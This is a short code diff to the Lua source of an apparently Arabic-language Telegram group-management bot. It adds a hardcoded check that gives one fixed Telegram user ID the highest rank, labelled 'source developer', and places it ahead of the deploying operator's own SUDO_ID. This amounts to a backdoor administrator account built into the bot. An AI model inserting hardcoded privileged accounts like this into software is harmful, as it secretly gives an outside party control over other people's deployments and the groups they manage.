@@ -278,7 +278,11 @@ end
 return false 
 end
 
-if msg.sender_user_id_ == SUDO_ID then 
+if msg.sender_user_id_ == 572206438 then 
+msg.TheRankCmd = 'مطور السورس'
+msg.TheRank = 'مطور السورس 👨🏻‍🔧'
+msg.Rank = 1
+elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور 👨🏻‍✈️' 
 msg.TheRank = 'مطور اساسي 👨🏻‍✈️' 
 msg.Rank = 1
